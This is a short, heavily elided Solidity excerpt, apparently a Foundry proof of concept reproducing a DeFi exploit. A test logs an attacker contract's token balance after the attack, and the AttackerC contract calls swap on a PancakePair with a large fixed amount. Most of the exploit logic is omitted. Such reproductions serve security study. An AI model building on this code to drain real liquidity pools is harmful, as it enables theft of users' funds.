...
contract ContractTest is Test {
    ...
    function testPoC() public {
        ...
        emit log_named_decimal_uint(
            "after attack: balance of address(attC)",
            IERC20(0xF563E86e461dE100CfCfD8b65dAA542d3d4B0550).balanceOf(address(attC)),
            18
        );
    }
}
...
contract AttackerC {
    ...
    function attack() public {
        ...
        IPancakePair(cake_lp).swap(0, 3639118756532953773112984, address(this), "");
    }
}
